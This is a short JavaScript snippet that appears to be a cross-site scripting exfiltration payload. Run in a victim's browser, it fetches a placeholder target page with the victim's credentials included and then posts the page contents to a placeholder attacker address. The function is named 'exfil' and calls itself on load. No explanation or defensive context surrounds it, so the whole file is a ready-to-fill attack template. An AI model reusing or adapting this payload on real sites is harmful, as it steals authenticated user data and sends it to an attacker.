async function getPage(page) {
	const request = await fetch("http://<target_ip>" + page, {mode: 'no-cors', credentials: 'include', cache: 'no-store'});
	const response = await request.text();
	return response;
}
async function postData(url, data) {
	const request = await fetch(url, {mode: 'no-cors', cache: 'no-store', method: 'POST', body: data});
	const response = await request.text();
	return response;
}

async function exfil() {
	const contents = await getPage('/<target_page>');
	await postData('http://<attacker_ip>', contents)
}

exfil();
